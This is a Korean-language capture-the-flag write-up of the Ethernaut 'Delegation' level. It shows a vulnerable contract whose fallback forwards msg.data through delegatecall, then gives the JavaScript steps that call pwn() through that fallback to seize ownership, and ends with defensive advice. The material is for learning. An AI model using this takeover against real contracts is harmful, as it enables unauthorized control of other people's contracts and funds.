# Ethernaut Level 6 - Delegation

## 문제 설명

`Delegation` 컨트랙트의 소유권을 획득하는 것이 목표이다.
`delegatecall`과 `fallback` 함수의 조합을 이용한다.

---

## 컨트랙트 분석

```solidity
contract Delegate {
    address public owner;

    constructor(address _owner) public {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) public {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

---

## 취약점 분석

### 1. delegatecall의 특성

`delegatecall`은 **호출된 컨트랙트의 코드**를 **호출한 컨트랙트의 컨텍스트**에서 실행한다.

```
Delegation.delegatecall(Delegate.pwn())
→ Delegate.pwn()의 코드가 실행되지만
→ storage는 Delegation의 것을 수정
→ owner = msg.sender → Delegation의 owner가 변경됨
```

### 2. fallback을 통한 접근

`Delegation`에는 `pwn()` 함수가 없으므로,
`pwn()` 함수 시그니처를 `msg.data`에 담아 보내면 fallback이 트리거된다.

---

## 공격 단계

### Step 1 — pwn() 함수 시그니처 계산

```js
web3.eth.abi.encodeFunctionSignature("pwn()")
// → "0xdd365b8b"
```

### Step 2 — fallback 트리거

```js
await sendTransaction({
    from: player,
    to: contract.address,
    data: web3.eth.abi.encodeFunctionSignature("pwn()")
})
```

### Step 3 — 확인

```js
await contract.owner()
// → 내 지갑 주소
```

---

## 핵심 교훈

```solidity
// ❌ 위험
(bool result,) = address(delegate).delegatecall(msg.data);

// ✅ 안전
// delegatecall 사용 시 반드시 화이트리스트 기반 함수 선택자 검증
// msg.data를 그대로 delegatecall에 넘기지 말 것
```

`delegatecall`은 스토리지를 공유하므로 신뢰할 수 없는 컨트랙트에 절대 사용 금지.
